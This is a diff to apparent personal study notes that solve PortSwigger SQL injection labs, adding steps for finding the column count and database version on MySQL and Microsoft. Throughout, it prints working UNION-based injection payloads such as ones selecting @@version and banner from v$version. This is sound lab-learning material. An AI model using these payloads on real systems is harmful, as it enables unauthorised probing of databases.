@@ -106,10 +106,24 @@ There is a built-in table on Oracle called DUAL which you can use for this purpo
    the payload will be like:
    
    `'+UNION+SELECT+banner,NULL+FROM+v$version--`
+   
    `'+UNION+SELECT+version,NULL+FROM+v$instance--`
    
+[8.Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft) 
+
+ 1. *Solutions*
+
+   By applying `'+UNION+SELECT+NULL,NULL+FROM+DUAL#` we can say the database has tow columns.
+   By applying `'+UNION+SELECT+'abc','xyz'+FROM+DUAL#` we can say the first and second columns have string values.
+   Now to retrieve data from only one column we can use the following payload
+   to retrieve the version of the database, for Microsoft DB we can use [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet):
    
- 
+   Microsoft	SELECT @@version
+   
+   the payload will be like:
+   
+   `'+UNION+SELECT+@@version,NULL+FROM+DUAL#`
+   `'+UNION+SELECT+NULL,@@version+FROM+DUAL#`
    
    
    
